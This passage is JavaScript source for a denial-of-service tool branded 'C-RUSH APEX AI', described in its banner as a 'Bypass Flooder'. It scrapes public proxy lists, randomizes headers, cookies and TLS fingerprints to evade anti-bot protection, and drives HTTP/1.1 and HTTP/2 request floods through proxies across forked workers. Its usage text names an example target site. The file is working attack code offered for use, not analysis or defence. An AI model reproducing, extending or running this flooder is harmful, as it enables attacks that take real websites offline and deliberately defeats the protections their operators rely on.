        'Cache-Control': options.cache ? 'max-age=0' : 'no-cache',
        'Connection': 'Keep-Alive',
        'Host': new URL(targetUrl).hostname,
        'User-Agent': userAgent
    };

    if (options.cookies) {
        baseHeaders['Cookie'] = generatePerfectCookies(targetUrl, detectedProtection);
    }

    if (options.headfull) {
        const profile = fingerprintMatcher.getMatchingFingerprint(detectedProtection, regionalSettings);
        Object.assign(baseHeaders, profile.secHeaders, {
            'Upgrade-Insecure-Requests': '1',
            'DNT': '1'
        });
    }

    // Apply apex intelligent bypass
    const finalHeaders = apexIntelligentBypass(targetUrl, baseHeaders, detectedProtection);

    // Convert headers to string with randomization
    let headersString = '';
    const headerEntries = Object.entries(finalHeaders);
    
    // Randomize header order for additional evasion
    if (Math.random() > 0.5) {
        headerEntries.sort(() => Math.random() - 0.5);
    }
    
    for (const [key, value] of headerEntries) {
        headersString += `${key}: ${value}\r\n`;
    }

    const pathWithParams = new URL(targetUrl).pathname + 
        (Math.random() > 0.3 ? '?' + crypto.randomBytes(6).toString('hex') + '=' + crypto.randomBytes(6).toString('hex') : '');

    return Buffer.from(`${method} ${pathWithParams} HTTP/1.1\r\n${headersString}\r\n`, 'binary');
}

// ===== APEX HTTP/2 HEADERS - ENHANCED =====
function buildApexHTTP2Headers(targetUrl) {
    const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS'];
    const method = methods[Math.floor(Math.random() * methods.length)];
    const userAgent = generatePerfectUserAgent(detectedProtection, regionalSettings);
    const profile = fingerprintMatcher.getMatchingFingerprint(detectedProtection, regionalSettings);

    let headers = [
        [':method', method],
        [':authority', new URL(targetUrl).hostname],
        [':scheme', 'https'],
        [':path', new URL(targetUrl).pathname + (Math.random() > 0.3 ? '?' + crypto.randomBytes(6).toString('hex') : '')],
        ['user-agent', userAgent],
        ['accept', profile.accept],
        ['accept-encoding', 'gzip, deflate, br'],
        ['accept-language', profile.acceptLanguage],
        ['cache-control', options.cache ? 'max-age=0' : 'no-cache']
    ];

    if (options.cookies) {
        headers.push(['cookie', generatePerfectCookies(targetUrl, detectedProtection)]);
    }

    if (options.headfull) {
        Object.entries(profile.secHeaders).forEach(([key, value]) => {
            headers.push([key.toLowerCase(), value]);
        });
    }

    return headers;
}

// ===== PERFORMANCE OPTIMIZATIONS =====
function optimizeSystemPerformance() {
    // Increase memory limits
    if (options.apex) {
        require("events").EventEmitter.defaultMaxListeners = Number.MAX_SAFE_INTEGER;
        process.setMaxListeners(0);
        
        // Optimize garbage collection
        if (global.gc) {
            setInterval(() => {
                global.gc();
            }, 30000);
        }
        
        // Optimize network buffers
        require('http').globalAgent.maxSockets = Infinity;
        require('https').globalAgent.maxSockets = Infinity;
    }
}

// ===== ARGUMENT PARSING =====
const args = process.argv.slice(2);
const options = {
    cookies: args.includes('-c'),
    headfull: args.includes('-h'),
    version: args.includes('-v') ? args[args.indexOf('-v') + 1] : '2',
    cache: args.includes('-ch') ? args[args.indexOf('-ch') + 1] === 'true' : true,
    debug: !args.includes('-s'),
    turbo: args.includes('-t'),
    apex: args.includes('-a'),
    ai: args.includes('-ai') // New AI-powered adaptation mode
};

const proxyList = [
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
    'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
    'https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt',
    'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt',
    'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
    'http://worm.rip/http.txt',
    'https://proxyspace.pro/http.txt',
    'https://proxy-spider.com/api/proxies.example.txt1',
    'http://193.200.78.26:8000/http?key=free'
];

async function scrapeProxies() {
    const file = "proxy.txt";

    try {
        if (fs.existsSync(file)) {
            fs.unlinkSync(file);
            if(options.debug) console.log(colors.warning(`File ${file} removed!\n`) + colors.system(`Refreshing proxies...\n`));
        }

        for (const proxy of proxyList) {
            try {
                const response = await httpx.get(proxy);
                fs.appendFileSync(file, response.data);
            } catch (err) {
                continue;
            }
        }

        const total = fs.readFileSync(file, 'utf-8').split('\n').length;
        if(options.debug) console.log(`${colors.elite(`( ${colors.stats(total)} ${colors.elite(')')} ${colors.success('Proxies scraped/refreshed.')}`)}`)

    } catch (err) {
        if(options.debug) console.log(colors.warning('Error scraping proxies'));
        process.exit(1);
    }
}

// Enhanced error handling
require("events").EventEmitter.defaultMaxListeners = Number.MAX_SAFE_INTEGER;
process.setMaxListeners(0);

process.emitWarning = function() {};

process
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

if (process.argv[2] === 'scrape') {
    console.clear();
    scrapeProxies();
    return;
}

if (process.argv.length < 7) {
    console.clear();
    console.log(colors.apex(`
    ${getSpinner()} ${colors.elite(`C-RUSH APEX AI`)} ${colors.apex(`- Ultimate Intelligent Bypass Flooder`)}

    ${colors.elite(`Features${colors.apex(`:`)}`)}
    ${colors.system(`?`)} ${colors.ai(`AI-Powered Adaptation Engine`)} ${colors.system(`(Real-time technique optimization)`)}
    ${colors.system(`?`)} ${colors.elite(`Perfect Fingerprint Matching`)} ${colors.system(`(Headers + Cookies + TLS + User Agents)`)}
    ${colors.system(`?`)} ${colors.apex(`Advanced Behavioral Patterns`)} ${colors.system(`(Human-like request timing)`)}
    ${colors.system(`?`)} ${colors.elite(`Extended TLS Configuration`)} ${colors.system(`(200+ Ciphers & SigAlgs)`)}
    ${colors.system(`?`)} ${colors.ai(`Real-time Protocol Switching`)} ${colors.system(`(HTTP/1.1 ↔ HTTP/2)`)}
    ${colors.system(`?`)} ${colors.apex(`Universal Intelligent Bypass`)} ${colors.system(`(15+ Protection Systems)`)}
    ${colors.system(`?`)} ${colors.elite(`Performance Optimization`)} ${colors.system(`(Max CPU/Memory Utilization)`)}
    ${colors.system(`?`)} ${colors.ai(`Machine Learning Adaptation`)} ${colors.system(`(Pattern Recognition)`)}

    ${colors.elite(`Usage${colors.apex(`:`)}`)}
    ${colors.system(`node c-rush.js <target> <duration> <proxies.txt> <threads> <rate> [options]`)}
    ${colors.system(`node c-rush.js scrape`)} ${colors.elite(`(to scrape proxies)`)}

    ${colors.elite(`Options${colors.apex(`:`)}`)}
    ${colors.system(`-c: Enable perfect fingerprint cookies`)}
    ${colors.system(`-h: Enable enhanced headfull requests`)}
    ${colors.system(`-v <1/2>: Choose HTTP version (1 or 2)`)}
    ${colors.system(`-ch <true/false>: Enable/disable cache`)}
    ${colors.system(`-t: Enable turbo mode (2x performance)`)}
    ${colors.system(`-a: Enable apex mode (4x performance)`)}
    ${colors.system(`-ai: Enable AI adaptation (ULTIMATE BYPASS)`)}
    ${colors.system(`-s: Disable debug output`)}

    ${colors.elite(`Example${colors.apex(`:`)}`)}
    ${colors.system(`node c-rush.js https://target.ir 120 proxies.txt 100 64 -c -h -ai -a`)}
    `));
    process.exit(1);
}

const target = process.argv[2];
const duration = process.argv[3];
const proxyFile = process.argv[4];
const threads = parseInt(process.argv[5]);
const rate = parseInt(process.argv[6]);

// Initial protection detection
detectProtectionSystem(target);

let proxies = [];
let proxy = [];

try {
    proxies = fs.readFileSync(proxyFile, 'utf-8').toString().split('\n').filter(p => p.length > 0);
    proxy = proxies;
} catch (e) {
    if(options.debug) console.log(colors.warning('?? Error loading proxy file'));
    process.exit(1);
}

let stats = {
    requests: 0,
    goaway: 0,
    success: 0,
    forbidden: 0,
    errors: 0
}

let statusesQ = [];
let statuses = {};
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let timer = 0;

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const url = new URL(target);

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}

function encodeRstStream(streamId, type, flags) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(type, 4);
    frameHeader.writeUInt8(flags, 5);
    frameHeader.writeUInt32BE(streamId, 5);
    const statusCode = Buffer.alloc(4).fill(0);
    return Buffer.concat([frameHeader, statusCode]);
}

const http1Payload = Buffer.concat(new Array(1).fill(buildApexRequest(target)))

function go() {
    const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');

    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        go()
        return
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: options.version === '1' ? ['http/1.1'] : ['h2', 'http/1.1'],
                servername: url.hostname,
                ciphers: eliteCiphers,
                sigalgs: eliteSigAlgs,
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | 
                               crypto.constants.SSL_OP_NO_TICKET | 
                               crypto.constants.SSL_OP_NO_SSLv2 | 
                               crypto.constants.SSL_OP_NO_SSLv3 | 
                               crypto.constants.SSL_OP_NO_COMPRESSION | 
                               crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
                               crypto.constants.SSL_OP_TLSEXT_PADDING |
                               crypto.constants.SSL_OP_ALL,
                secure: true,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                rejectUnauthorized: false
            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1' || options.version === '1') {
                    function doWrite() {
                        tlsSocket.write(http1Payload, (err) => {
                            if (!err) {
                                setTimeout(() => {
                                    doWrite()
                                }, isFull ? (options.apex ? 250 : (options.turbo ? 500 : 1000)) : (options.apex ? 250 / rate : (options.turbo ? 500 / rate : 1000 / rate)))
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy())
                            }
                        })
                    }

                    doWrite()

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy())
                    })
                    return
                }

                let streamId = 1
                let data = Buffer.alloc(0)
                let hpack = new HPACK()
                hpack.setTableSize(4096)

                const updateWindow = Buffer.alloc(4)
                updateWindow.writeUInt32BE(custom_update, 0)

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, custom_header],
                        [2, 0],
                        [4, custom_window],
                        [6, custom_table]
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData])

                    while (data.length >= 9) {
                        const frame = decodeFrame(data)
                        if (frame != null) {
                            data = data.subarray(frame.length + 9)
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1))
                            }
                            if (frame.type == 7 || frame.type == 5) {
                                tlsSocket.write(encodeRstStream(0, 3, 0));
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        } else {
                            break
                        }
                    }
                })

                tlsSocket.write(Buffer.concat(frames))

                function doWrite() {
                    if (tlsSocket.destroyed) {
                        return
                    }

                    const requests = []
                    const headers = buildApexHTTP2Headers(target);

                    const packed = Buffer.concat([
                        Buffer.from([0x80, 0, 0, 0, 0xFF]),
                        hpack.encode(headers)
                    ]);

                    requests.push(encodeFrame(streamId, 1, packed, 0x25));
                    streamId += 2;

                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (!err) {
                            setTimeout(doWrite, (options.apex ? 250 / rate : (options.turbo ? 500 / rate : 1000 / rate)));
                        }
                    });
                }

                doWrite();
            });
        });

        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    });

    netSocket.on('error', () => {
        netSocket.destroy();
        go();
    });
}

// System optimization
optimizeSystemPerformance();

if (cluster.isMaster) {
    console.clear();
    if(options.debug) {
        console.log(colors.apex(`
 ${getSpinner()} ${colors.elite(`C-RUSH APEX AI`)} ${colors.apex(`- Ultimate Intelligent Bypass Flooder`)}
     ${colors.system(`Made with ?? by ${colors.apex(`@privflood`)} | AI-Powered Evasion`)}

  ${colors.elite(`Target${colors.apex(`:`)}`)} ${colors.system(target)}
  ${colors.elite(`Duration${colors.apex(`:`)}`)} ${colors.system(`${duration}s`)}
  ${colors.elite(`Threads${colors.apex(`:`)}`)} ${colors.system(threads)}
  ${colors.elite(`Rate${colors.apex(`:`)}`)} ${colors.system(`${rate}/s`)}
  ${colors.elite(`HTTP Version${colors.apex(`:`)}`)} ${colors.system(options.version === '1' ? 'HTTP/1.1' : 'HTTP/2')}
  ${colors.elite(`Cookies${colors.apex(`:`)}`)} ${colors.system(options.cookies ? colors.success('Perfect Fingerprint') : colors.warning('Disabled'))}
  ${colors.elite(`Headfull${colors.apex(`:`)}`)} ${colors.system(options.headfull ? colors.success('Enhanced') : colors.warning('Disabled'))}
  ${colors.elite(`Cache${colors.apex(`:`)}`)} ${colors.system(options.cache ? colors.success('Enabled') : colors.warning('Disabled'))}
  ${colors.elite(`Turbo Mode${colors.apex(`:`)}`)} ${colors.system(options.turbo ? colors.success('ACTIVE') : colors.warning('Disabled'))}
  ${colors.elite(`Apex Mode${colors.apex(`:`)}`)} ${colors.system(options.apex ? colors.success('ACTIVE') : colors.warning('Disabled'))}
  ${colors.elite(`AI Adaptation${colors.apex(`:`)}`)} ${colors.system(options.ai ? colors.ai('ACTIVE') : colors.warning('Disabled'))}
  ${colors.elite(`Detected Protection${colors.apex(`:`)}`)} ${colors.stats(detectedProtection.toUpperCase())}
  ${colors.elite(`Active Technique${colors.apex(`:`)}`)} ${colors.system(activeTechnique.toUpperCase())}
  ${colors.elite(`Regional Settings${colors.apex(`:`)}`)} ${colors.system(regionalSettings.toUpperCase())}
  ${colors.elite(`Bypass Intelligence${colors.apex(`:`)}`)} ${colors.ai('AI-POWERED ACTIVE')}
  ${colors.elite(`Fingerprint Matching${colors.apex(`:`)}`)} ${colors.success('PERFECT SYNCHRONIZATION')}
`));
    }

    let totalRequests = 0;
    let peakRPS = 0;
    let startTime = Date.now();
    
    setInterval(() => {
        const currentRPS = rate * threads;
        if (currentRPS > peakRPS) peakRPS = currentRPS;
        
        const elapsed = (Date.now() - startTime) / 1000;
        const averageRPS = totalRequests / elapsed;
        
        setTitle(`C-RUSH APEX AI | Sent: ${totalRequests} | RPS: ${currentRPS} | Peak: ${peakRPS} | Avg: ${averageRPS.toFixed(1)} | ${detectedProtection} Bypass`);
        totalRequests += currentRPS;
        
        // Display real-time stats
        if(options.debug && Math.random() < 0.1) {
            console.log(colors.stats(`${getSpinner()} AI Analysis: ${aiEngine.getOptimalTechnique(target)} | Avg Response: ${aiEngine.getAverageResponseTime().toFixed(1)}ms`));
        }
    }, 1000);

    for(let i = 0; i < threads; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        if(options.debug) {
            const elapsed = (Date.now() - startTime) / 1000;
            const averageRPS = totalRequests / elapsed;
            
            console.log(colors.success('\n? Apex AI attack finished'));
            console.log(colors.system(`Peak RPS: ${colors.stats(peakRPS)} | Total Requests: ${colors.stats(totalRequests)} | Average RPS: ${colors.stats(averageRPS.toFixed(1))}`));
            console.log(colors.system(`AI Adaptation: ${colors.ai(aiEngine.successPatterns.size + aiEngine.failurePatterns.size)} patterns learned`));
        }
        process.exit(0);
    }, duration * 1000);
} else {
    const interval = options.apex ? 250 / rate : (options.turbo ? 500 / rate : 1000 / rate);
    setInterval(() => {
        go();
    }, interval);
}